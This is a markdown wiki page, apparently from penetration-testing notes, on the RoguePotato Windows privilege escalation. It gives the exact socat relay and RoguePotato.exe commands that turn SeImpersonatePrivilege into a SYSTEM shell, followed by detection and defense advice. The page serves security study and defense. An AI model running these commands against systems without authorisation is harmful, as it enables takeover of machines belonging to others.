# RoguePotato

RoguePotato (by antonioCoco) is the successor to JuicyPotato for **Windows 10 1809+ and Server 2019**, where Microsoft killed the original JuicyPotato technique by restricting local DCOM CLSID abuse. RoguePotato revives the attack by forcing the DCOM activation to go through an attacker-controlled **OXID resolver** on TCP port 135, redirecting the SYSTEM authentication to a local named pipe it can impersonate. Like every potato, it converts `SeImpersonatePrivilege` into a SYSTEM shell.

## Requirements

- `SeImpersonatePrivilege` enabled.
- Windows 10 1809+ / Server 2019 (also works earlier).
- Ability to reach a redirector on **port 135** — typically `socat` on your attacker box, or a local redirect if outbound 135 is blocked.

```powershell
whoami /priv | findstr /i "SeImpersonate"
```

## How it works

1. RoguePotato triggers DCOM activation of a SYSTEM COM object.
2. It supplies a fake OXID resolver address so the object's authentication is redirected to the attacker's port 135 relay.
3. The relay forwards the RPC back to a local named pipe RoguePotato controls.
4. It impersonates the SYSTEM token delivered over that pipe and spawns a process.

## Exploitation

On the attacker box, redirect 135 back to the target's RoguePotato listener:

```bash
socat tcp-listen:135,reuseaddr,fork tcp:10.10.10.5:9999
```

On the target:

```cmd
RoguePotato.exe -r 10.10.14.7 -e "cmd.exe" -l 9999
```

`-r` is the OXID resolver (your redirector), `-l` the local listening port, `-e` the command. If outbound 135 is filtered, run with `-r 127.0.0.1` and set up a local port-forward instead.

Confirm:

```cmd
whoami
:: -> nt authority\system
```

## Detection and defenses

- **Detection:** outbound TCP/135 from a workstation to an external host, anomalous DCOM/RPC activity, a service account spawning an interactive shell, Sysmon named-pipe events.
- **Defenses:** strip `SeImpersonatePrivilege` from non-essential accounts, block outbound 135 at the perimeter, keep hosts patched, monitor DCOM launch permissions.

## Related
- [Impersonation and Potato Attacks](Impersonation-and-Potato-Attacks.md) — folder hub and potato-family comparison table
- [Juicy Potato](Juicy-Potato.md) — the pre-1809 technique RoguePotato replaces
- [PrintSpoofer](PrintSpoofer.md) — spooler-based alternative on the same privilege
- [God Potato](God-Potato.md) — universal modern potato
- [Token Privilege Abuse](../Token-Privilege-Abuse/Token-Privilege-Abuse.md) — the SeImpersonatePrivilege context this exploits
